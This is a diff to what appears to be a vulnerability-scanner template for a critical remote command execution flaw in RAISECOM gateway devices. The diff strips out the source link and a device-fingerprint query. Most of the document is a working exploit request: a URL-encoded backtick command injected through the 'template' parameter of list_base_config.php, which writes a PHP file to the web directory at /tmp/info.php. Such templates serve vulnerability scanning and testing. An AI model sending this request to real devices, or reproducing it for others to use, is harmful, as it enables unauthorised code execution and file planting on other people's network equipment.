@@ -3,12 +3,8 @@ info:
   name: RAISECOM网关设备list_base_config.php存在远程命令执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ztas8vs0mwfct75f'
+  description: ''
   tags: rce,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ztas8vs0mwfct75f
-    fofa: body="/images/raisecom/back.gif"
 http:
 - raw:
   - 'GET /vpn/list_base_config.php?type=mod&parts=base_config&template=%60echo+-e+%27%3C%3Fphp+phpinfo%28%29%3B%3F%3E%27%3E%2Fwww%2Ftmp%2Finfo.php%60 HTTP/1.1
@@ -16,7 +12,6 @@ http:
     Host: {{Hostname}}
 
     User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
-
 
 
     文件路径http://ip/tmp/info.php'
